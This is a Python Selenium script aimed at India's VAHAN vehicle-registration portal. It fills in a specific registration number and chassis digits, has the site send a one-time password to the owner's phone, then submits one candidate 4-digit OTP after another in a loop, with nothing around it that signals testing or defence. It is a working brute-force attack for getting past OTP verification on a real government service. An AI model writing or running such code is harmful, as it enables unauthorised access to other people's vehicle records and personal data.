# from firstFile import a
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# options = webdriver.ChromeOptions()
# options.add_argument('--headless')
# options.add_argument('--disable-gpu')

# create chrome driver
# driver = webdriver.Chrome(chrome_options=options)
driver=webdriver.Chrome(executable_path="chromedriver.exe")

# driver=webdriver.Chrome(executable_path="chromedriver.exe",chrome_options=options)
driver.maximize_window()
driver.get("https://vahan.parivahan.gov.in/vahanservice/vahan/ui/statevalidation/homepage.xhtml?statecd=Mzc2MzM2MzAzNjY0MzIzODM3NjIzNjY0MzY2MjM3NGI0MQ==")
# vNo=input(input("enter vehicle no: "))
# print("you entered vehicle no is : " ,vNo)
# driver.find_element(By.ID,"regnid").send_keys("ka28n2770")

driver.find_element(By.ID,"fit_c_office_to").click()
sleep(2)
driver.find_element(By.CSS_SELECTOR,"#fit_c_office_to_56").click()
# driver.find_element(By.ID,"regnid").send_keys(vNo)
driver.find_element(By.ID,"proccedHomeButtonId").click()

print("before time")
sleep(5)
print("before after time",len(driver.window_handles))
# driver.quit()
# if driver.find_element(By.ID,"j_idt514"):
#     print("trueeeeeeeeeeeeeeeeeeee")
driver.find_element(By.CSS_SELECTOR,"#facelesslist button").click()
sleep(3)
print("after clic proceed")
driver.find_element(By.CSS_SELECTOR,"a #trigger10").click()
sleep(5)
# driver.find_element(By.CSS_SELECTOR,"#form_eapp\:tf_chasis_no").send_keys("01012")
driver.find_element(By.ID,"form_eapp:tf_reg_no").send_keys("KA68k0390")
driver.find_element(By.CSS_SELECTOR,"#form_eapp\:tf_chasis_no").send_keys("36954")
sleep(5)
driver.find_element(By.ID,"form_eapp:validate_button").click()
sleep(5)
driver.find_element(By.CSS_SELECTOR,"a.ui-commandlink.ui-widget .mobileImg").click()
sleep(5)
driver.find_element(By.ID,"form_eapp:bt_gnrtOtp").click()
sleep(5)
driver.find_element(By.XPATH,"//*[@id='primefacesmessagedlg']/div[1]/a/span").click()

sleep(5)
numbers = a
# numbers = ["1", "20", "10003"]
numbers = [str(x).rjust(4,'0') for x in numbers] 
# print(numbers[2])
print("otp even started")
for otp in range(6001,7001,2):
    print(numbers[otp])
    wait = WebDriverWait(driver, 30)
    driver.find_element(By.ID, "form_eapp:otp_text").send_keys(numbers[otp])

    driver.find_element(By.XPATH,"//*[@id='form_eapp:tf_show_button']").click()
    elem=driver.find_elements(By.CSS_SELECTOR, ".ui-blockui.ui-widget-overlay.ui-helper-hidden")
    wait.until(EC.invisibility_of_element_located(elem[1]))
print("otp odd started")
for otp in range(6000,7000, 2):
    print(numbers[otp])
    wait = WebDriverWait(driver,30)
    driver.find_element(By.ID, "form_eapp:otp_text").send_keys(numbers[otp])

    driver.find_element(By.XPATH,"//*[@id='form_eapp:tf_show_button']").click()
    elem=driver.find_elements(By.CSS_SELECTOR, ".ui-blockui.ui-widget-overlay.ui-helper-hidden")
    wait.until(EC.invisibility_of_element_located(elem[1]))
b=input("Enter no")
